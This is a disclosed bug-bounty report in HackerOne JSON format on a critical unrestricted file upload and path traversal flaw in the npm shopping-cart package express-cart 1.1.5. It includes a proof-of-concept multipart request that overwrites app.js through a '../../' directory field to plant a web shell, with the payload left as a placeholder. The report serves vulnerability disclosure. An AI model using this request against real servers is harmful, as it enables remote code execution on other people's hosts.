{
  "id": 343726,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDM3MjY=",
  "url": "https://hackerone.com/reports/343726",
  "title": "Unrestricted file upload (RCE)",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2018-04-26T21:54:11.434Z",
  "submitted_at": "2018-04-26T21:54:11.434Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "patrickrbc",
    "url": "/patrickrbc",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/z93gc9obcr6jntighku2fjxm1nxj/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2018-3758"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-06-02T07:20:08.023Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-06-02T07:19:59.843Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report an unrestricted file upload in express-cart.\n\nIt allows a user with administrative privileges to upload a file to any path.\n\n# Module\n\n**module name:** express-cart\n**version:** 1.1.5\n**npm page:** `https://www.npmjs.com/package/express-cart`\n\n## Module Description\n\nexpressCart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.\n\n# Vulnerability\n\n## Vulnerability Description\n\nA privileged user can use the upload functionality to gain access to the server.\n\nThe application offers the possibility of uploading product images. However, there are many problems with the way it handles these uploads.\n\nFirstly, it uses a path provided by the user. This path is not validated, therefore, it would allow the user to upload the file to any path on the hosting server.\n\nSecondly, it does not restrict the type of the file being uploaded, therefore, it would allow the user to upload a malicious file to gain access to the server.\n\nFinally, it does not restrict the size of the file. This would allow to easily exhaust the host resources and consequently produce a DoS.\n  \n## Steps To Reproduce:\n\nThere are many ways this vulnerability could be exploited. Supposing our goal would be to establish access to the host machine, we could replace the *app.js* file with a malicious JavaScript that would give us a web shell.\n\nOnce you have administrator privileges you can use a request similar to:\n\n```\nPOST /admin/file/upload HTTP/1.1\nHost: localhost:1111\nReferer: http://localhost:1111/\nContent-Type: multipart/form-data; boundary=---------------------------1099055603892737061752875043\nCookie: [ADMINISTRATOR_COOKIE]\n\n-----------------------------1099055603892737061752875043\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"app.js\"\nContent-Type: image/png\n\n[MALICIOUS_JAVASCRIPT]\n-----------------------------1099055603892737061752875043\nContent-Disposition: form-data; name=\"productId\"\n\n5ae2228d995e3e5d7c96474d\n-----------------------------1099055603892737061752875043\nContent-Disposition: form-data; name=\"directory\"\n\n../../\n-----------------------------1099055603892737061752875043\nContent-Disposition: form-data; name=\"saveButton\"\n\n-----------------------------1099055603892737061752875043--\n```\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nThis vulnerability would allow a privileged user to gain access in the hosting machine.",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-07-02T07:19:59.954Z",
  "allow_singular_disclosure_after": -177313391.98997343,
  "singular_disclosure_allowed": true,
  "vote_count": 11,
  "voters": [
    "whybee",
    "bl4de",
    "patrickrbc",
    "eveeez",
    "lumbridge",
    "sh3r1",
    "0x08",
    "rmkreborn",
    "nlattimer",
    "maharjansharat",
    "and 1 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.1,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 10291,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "express-cart",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
